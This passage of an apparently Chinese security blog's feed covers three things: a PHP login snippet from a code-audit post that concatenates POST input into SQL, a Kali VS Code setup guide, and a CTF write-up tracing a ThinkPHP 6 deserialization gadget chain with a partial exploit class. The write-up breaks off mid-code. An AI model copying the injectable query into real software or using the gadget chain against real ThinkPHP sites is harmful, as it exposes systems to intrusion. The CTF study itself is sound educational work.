class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[user] &amp;&amp; <span class="hljs-variable">$_POST</span>[pass]) &#123;<br><span class="hljs-variable">$conn</span> = mysql_connect(<span class="hljs-string">&quot;********&quot;</span>, <span class="hljs-string">&quot;*****&quot;</span>, <span class="hljs-string">&quot;********&quot;</span>);<br>mysql_select_db(<span class="hljs-string">&quot;phpformysql&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Could not select database&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$conn</span>-&gt;connect_error) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connection failed: &quot;</span> . mysql_error(<span class="hljs-variable">$conn</span>));<br>&#125;<br><span class="hljs-variable">$user</span> = <span class="hljs-variable">$_POST</span>[user];<br><span class="hljs-variable">$pass</span> = md5(<span class="hljs-variable">$_POST</span>[pass]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select pw from php where user=&#x27;<span class="hljs-subst">$user</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$query</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$query</span>) &#123;<br>printf(<span class="hljs-string">&quot;Error: %s\n&quot;</span>, mysql_error(<span class="hljs-variable">$conn</span>));<br><span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-variable">$row</span> = mysql_fetch_array(<span class="hljs-variable">$query</span>, MYSQL_ASSOC);<br><span class="hljs-comment">//echo $row[&quot;pw&quot;];</span><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$row</span>[pw]) &amp;&amp; (!strcasecmp(<span class="hljs-variable">$pass</span>, <span class="hljs-variable">$row</span>[pw]))) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;</span>);<br>  &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kali安装Vscode并同步你的设置</title>
    <link href="/2022/03/02/Kali%E5%AE%89%E8%A3%85Vscode%E5%B9%B6%E5%90%8C%E6%AD%A5%E4%BD%A0%E7%9A%84%E8%AE%BE%E7%BD%AE/"/>
    <url>/2022/03/02/Kali%E5%AE%89%E8%A3%85Vscode%E5%B9%B6%E5%90%8C%E6%AD%A5%E4%BD%A0%E7%9A%84%E8%AE%BE%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="安装Vscode"><a href="#安装Vscode" class="headerlink" title="安装Vscode"></a>安装Vscode</h2><h3 id="添加软件源"><a href="#添加软件源" class="headerlink" title="添加软件源"></a>添加软件源</h3><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">curl https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor &gt; microsoft.gpg<br>mv microsoft.gpg /etc/apt/trusted.gpg.d/microsoft.gpg<br>sh -c &#x27;echo &quot;deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main&quot; &gt; /etc/apt/sources.list.d/vscode.list&#x27;<br></code></pre></td></tr></table></figure><h3 id="下载软件"><a href="#下载软件" class="headerlink" title="下载软件"></a>下载软件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt-get update<br>apt-get install code<br></code></pre></td></tr></table></figure><p>note:如果你和我一样下载之后 图形化界面无法启动</p><p>不如直接改一下启动别动 不去记那些繁琐的参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim ~/.bashrc<br>添加<br>alias code=&#x27;/usr/share/code/code --no-sandbox --unity-launch %F&#x27;<br></code></pre></td></tr></table></figure><h2 id="同步你的设置"><a href="#同步你的设置" class="headerlink" title="同步你的设置"></a>同步你的设置</h2><ol><li>Vscode 下载应用 Setting Sync</li><li>进入github生成你的token，具体流程流程如下</li></ol><blockquote><p> Github::Settings -&gt; Developer settings -&gt; Personal access tokens::Generate new token</p></blockquote><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203031933168.png" alt="image-20220303193312061"></p><center>选择设置</center><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203031934389.png" alt="image-20220303193426336"></p><center>选择开发者选项</center><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203031935752.png" alt="image-20220303193516707"></p><center>生成你的token</center><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203031936289.png" alt="image-20220303193628224"></p><center>完成这三项即可</center>    <p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203031939045.png" alt="image-20220303193915976"></p><center>复制你的token</center><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203031943689.png" alt="image-20220303194308615"></p><center>上传配置</center><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203031943555.png" alt="image-20220303194331501"></p><center>授权应用</center><p>3.上传你的配置<br><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203032203858.png" alt="image-20220303220312719"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203032204859.png" alt="image-20220303220415816"></p><p>上传成功之后你会得到一个GistID，保存下来。也就是图中Githubtoken下面那条</p><p>4.在需要同步设置的地方安装插件并输入你的Gistid</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203032205333.png" alt="image-20220303220526226">输入之后就可以成功同步你的设置了</p>]]></content>
    
    
    
    <tags>
      
      <tag>kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安洵杯 2019-iamthinking TP6反序列化链子分析</title>
    <link href="/2022/02/24/%E5%AE%89%E6%B4%B5%E6%9D%AF%202019-iamthinking%20TP6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/"/>
    <url>/2022/02/24/%E5%AE%89%E6%B4%B5%E6%9D%AF%202019-iamthinking%20TP6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="安洵杯-2019-iamthinking-TP6反序列化链子分析"><a href="#安洵杯-2019-iamthinking-TP6反序列化链子分析" class="headerlink" title="安洵杯 2019-iamthinking TP6反序列化链子分析"></a>安洵杯 2019-iamthinking TP6反序列化链子分析</h1><p>首先是利用链思路</p><figure class="highlight pgsql"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><pre><code class="hljs pgsql">think\Model <span class="hljs-comment">--&gt; __destruct()</span><br>think\Model <span class="hljs-comment">--&gt; save()</span><br>think\Model <span class="hljs-comment">--&gt; updateData()</span><br>think\Model <span class="hljs-comment">--&gt; db()</span><br><br>后半部分利用链（同tp <span class="hljs-number">5.2</span>后半部分利用链)<br><br>think\model\concern\<span class="hljs-keyword">Conversion</span> <span class="hljs-comment">--&gt; __toString()</span><br>think\model\concern\<span class="hljs-keyword">Conversion</span> <span class="hljs-comment">--&gt; __toJson()</span><br>think\model\concern\<span class="hljs-keyword">Conversion</span> <span class="hljs-comment">--&gt; __toArray()</span><br>think\model\concern\<span class="hljs-keyword">Attribute</span> <span class="hljs-comment">--&gt; getAttr()</span><br>think\model\concern\<span class="hljs-keyword">Attribute</span> <span class="hljs-comment">--&gt; getValue()</span><br></code></pre></td></tr></table></figure><p>这里分析也分两部分，以pop起点命名</p><h2 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h2><p><code>安洵杯 2019]iamthinking\www\tp\vendor\topthink\think-orm\src\Model.php</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202260040999.png" alt="image-20220226004010902"></p><p>​    来到了 Model.php 发现这里的 save方法可以利用，跟进一下save方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$data</span> = [], <span class="hljs-keyword">string</span> <span class="hljs-variable">$sequence</span> = <span class="hljs-literal">null</span></span>): <span class="hljs-title">bool</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// 数据对象赋值</span><br>        <span class="hljs-keyword">$this</span>-&gt;setAttrs(<span class="hljs-variable">$data</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;isEmpty() || <span class="hljs-literal">false</span> === <span class="hljs-keyword">$this</span>-&gt;trigger(<span class="hljs-string">&#x27;BeforeWrite&#x27;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-keyword">$this</span>-&gt;exists ? <span class="hljs-keyword">$this</span>-&gt;updateData() : <span class="hljs-keyword">$this</span>-&gt;insertData(<span class="hljs-variable">$sequence</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span> === <span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 写入回调</span><br>        <span class="hljs-keyword">$this</span>-&gt;trigger(<span class="hljs-string">&#x27;AfterWrite&#x27;</span>);<br><br>        <span class="hljs-comment">// 重新记录原始数据</span><br>        <span class="hljs-keyword">$this</span>-&gt;origin   = <span class="hljs-keyword">$this</span>-&gt;data;<br>        <span class="hljs-keyword">$this</span>-&gt;set      = [];<br>        <span class="hljs-keyword">$this</span>-&gt;lazySave = <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>​    关注一下自定义函数，line 4的没什么好说的。重点看 line 8的语句 只要 <code>$this-&gt;exists=True</code> 就会执行 updateData()函数，反之则执行insertData</p><p>​    这里选择走 updateData()这个函数。为什么不是 insertData？因为这个函数只实现了数据插入函数返回值也是布尔型没什么意义对于pop链挖掘来说。</p><p>哦，差点忘了，为了走到line 8，我们需要满足 <code>$this-&gt;isEmpty()==True || false !== $this-&gt;trigger(&#39;BeforeWrite&#39;))</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isEmpty</span>(<span class="hljs-params"></span>): <span class="hljs-title">bool</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;data);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里让 $data 非空</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$event</span></span>): <span class="hljs-title">bool</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;withEvent) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-variable">$call</span> = <span class="hljs-string">&#x27;on&#x27;</span> . Str::studly(<span class="hljs-variable">$event</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (method_exists(<span class="hljs-built_in">static</span>::class, <span class="hljs-variable">$call</span>)) &#123;<br>                <span class="hljs-variable">$result</span> = call_user_func([<span class="hljs-built_in">static</span>::class, <span class="hljs-variable">$call</span>], <span class="hljs-keyword">$this</span>);<br>            &#125; <span class="hljs-keyword">elseif</span> (is_object(<span class="hljs-built_in">self</span>::<span class="hljs-variable">$event</span>) &amp;&amp; method_exists(<span class="hljs-built_in">self</span>::<span class="hljs-variable">$event</span>, <span class="hljs-string">&#x27;trigger&#x27;</span>)) &#123;<br>                <span class="hljs-variable">$result</span> = <span class="hljs-built_in">self</span>::<span class="hljs-variable">$event</span>-&gt;trigger(<span class="hljs-built_in">static</span>::class . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$event</span>, <span class="hljs-keyword">$this</span>);<br>                <span class="hljs-variable">$result</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>) ? <span class="hljs-literal">true</span> : end(<span class="hljs-variable">$result</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$result</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> === <span class="hljs-variable">$result</span> ? <span class="hljs-literal">false</span> : <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (ModelEventException <span class="hljs-variable">$e</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>为了 让 trigger函数返回 true 可以直接让 withEvent&#x3D;False</p><p>然后再来到 updateData()这个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">updateData</span>(<span class="hljs-params"></span>): <span class="hljs-title">bool</span></span><br><span class="hljs-function">   </span>&#123;<br>       <span class="hljs-comment">// 事件回调</span><br>       <span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span> === <span class="hljs-keyword">$this</span>-&gt;trigger(<span class="hljs-string">&#x27;BeforeUpdate&#x27;</span>)) &#123;<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>       &#125;<br><br>       <span class="hljs-keyword">$this</span>-&gt;checkData();<br><br>       <span class="hljs-comment">// 获取有更新的数据</span><br>       <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;getChangedData();<br><br>       <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$data</span>)) &#123;<br>           <span class="hljs-comment">// 关联更新</span><br>           <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;relationWrite)) &#123;<br>               <span class="hljs-keyword">$this</span>-&gt;autoRelationUpdate();<br>           &#125;<br><br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>       &#125;<br><br>       <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;autoWriteTimestamp &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;updateTime &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$data</span>[<span class="hljs-keyword">$this</span>-&gt;updateTime])) &#123;<br>           <span class="hljs-comment">// 自动写入更新时间</span><br>           <span class="hljs-variable">$data</span>[<span class="hljs-keyword">$this</span>-&gt;updateTime]       = <span class="hljs-keyword">$this</span>-&gt;autoWriteTimestamp(<span class="hljs-keyword">$this</span>-&gt;updateTime);<br>           <span class="hljs-keyword">$this</span>-&gt;data[<span class="hljs-keyword">$this</span>-&gt;updateTime] = <span class="hljs-variable">$data</span>[<span class="hljs-keyword">$this</span>-&gt;updateTime];<br>       &#125;<br><br>       <span class="hljs-comment">// 检查允许字段</span><br>       <span class="hljs-variable">$allowFields</span> = <span class="hljs-keyword">$this</span>-&gt;checkAllowFields();<br><br>       <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;relationWrite <span class="hljs-keyword">as</span> <span class="hljs-variable">$name</span> =&gt; <span class="hljs-variable">$val</span>) &#123;<br>           <span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$val</span>)) &#123;<br>               <span class="hljs-keyword">continue</span>;<br>           &#125;<br><br>           <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$val</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>) &#123;<br>               <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$data</span>[<span class="hljs-variable">$key</span>])) &#123;<br>                   <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$data</span>[<span class="hljs-variable">$key</span>]);<br>               &#125;<br>           &#125;<br>       &#125;<br><br>       <span class="hljs-comment">// 模型更新</span><br>       <span class="hljs-variable">$db</span> = <span class="hljs-keyword">$this</span>-&gt;db();<br>       <span class="hljs-variable">$db</span>-&gt;startTrans();<br><br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-variable">$where</span>  = <span class="hljs-keyword">$this</span>-&gt;getWhere();<br>           <span class="hljs-variable">$result</span> = <span class="hljs-variable">$db</span>-&gt;where(<span class="hljs-variable">$where</span>)<br>               -&gt;strict(<span class="hljs-literal">false</span>)<br>               -&gt;field(<span class="hljs-variable">$allowFields</span>)<br>               -&gt;update(<span class="hljs-variable">$data</span>);<br><br>           <span class="hljs-keyword">$this</span>-&gt;checkResult(<span class="hljs-variable">$result</span>);<br><br>           <span class="hljs-comment">// 关联更新</span><br>           <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;relationWrite)) &#123;<br>               <span class="hljs-keyword">$this</span>-&gt;autoRelationUpdate();<br>           &#125;<br><br>           <span class="hljs-variable">$db</span>-&gt;commit();<br><br>           <span class="hljs-comment">// 更新回调</span><br>           <span class="hljs-keyword">$this</span>-&gt;trigger(<span class="hljs-string">&#x27;AfterUpdate&#x27;</span>);<br><br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>       &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>           <span class="hljs-variable">$db</span>-&gt;rollback();<br>           <span class="hljs-keyword">throw</span> <span class="hljs-variable">$e</span>;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>我依旧选择了关注自定义的函数</p><p>于是在跟进到 line 44时，我发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">db</span>(<span class="hljs-params"><span class="hljs-variable">$scope</span> = []</span>): <span class="hljs-title">Query</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/** <span class="hljs-doctag">@var</span> Query $query */</span><br>    <span class="hljs-variable">$query</span> = <span class="hljs-built_in">self</span>::<span class="hljs-variable">$db</span>-&gt;connect(<span class="hljs-keyword">$this</span>-&gt;connection)<br>        -&gt;name(<span class="hljs-keyword">$this</span>-&gt;name . <span class="hljs-keyword">$this</span>-&gt;suffix)<br>        -&gt;pk(<span class="hljs-keyword">$this</span>-&gt;pk);<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;table)) &#123;<br>        <span class="hljs-variable">$query</span>-&gt;table(<span class="hljs-keyword">$this</span>-&gt;table . <span class="hljs-keyword">$this</span>-&gt;suffix);<br>    &#125;  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">db</span>(<span class="hljs-params"><span class="hljs-variable">$scope</span> = []</span>): <span class="hljs-title">Query</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/** <span class="hljs-doctag">@var</span> Query $query */</span><br>    <span class="hljs-variable">$query</span> = <span class="hljs-built_in">self</span>::<span class="hljs-variable">$db</span>-&gt;connect(<span class="hljs-keyword">$this</span>-&gt;connection)<br>        -&gt;name(<span class="hljs-keyword">$this</span>-&gt;name . <span class="hljs-keyword">$this</span>-&gt;suffix)<br>        -&gt;pk(<span class="hljs-keyword">$this</span>-&gt;pk);<br></code></pre></td></tr></table></figure><p>这里做了字符串拼接，只要个name 或者 suffix 一个触发响应的类就可以触发<code>__toString</code> 方法。</p><p>我们先写个简易的exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>;<br><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span></span>&#123;<br>        <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$lazySave</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$withEvent</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$exists</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$table</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;lazySave = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;withEvent = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;exists = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;table = <span class="hljs-variable">$obj</span>;<br>    &#125;<br><br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h2><p><code>安洵杯 2019]iamthinking\www\tp\vendor\topthink\think-orm\src\model\concern\Conversion.php</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202252215505.png" alt="image-20220225221522339"></p><p>​    首先就是这个 <code>__toString()</code> 为什么是它，因为别的 <code>__toString()</code> 基本都是做的类型转换和字符串分割，不是预期的利用点。 跟进一下函数返回的toJson函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toJson</span>(<span class="hljs-params"><span class="hljs-keyword">int</span> <span class="hljs-variable">$options</span> = JSON_UNESCAPED_UNICODE</span>): <span class="hljs-title">string</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> json_encode(<span class="hljs-keyword">$this</span>-&gt;toArray(), <span class="hljs-variable">$options</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>​    然后看这个 toJson $options虽然写死，但是前面还有toArray的返回值作为函数参数，继续跟进。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toArray</span>(<span class="hljs-params"></span>): <span class="hljs-title">array</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$item</span>       = [];<br>        <span class="hljs-variable">$hasVisible</span> = <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;visible <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span 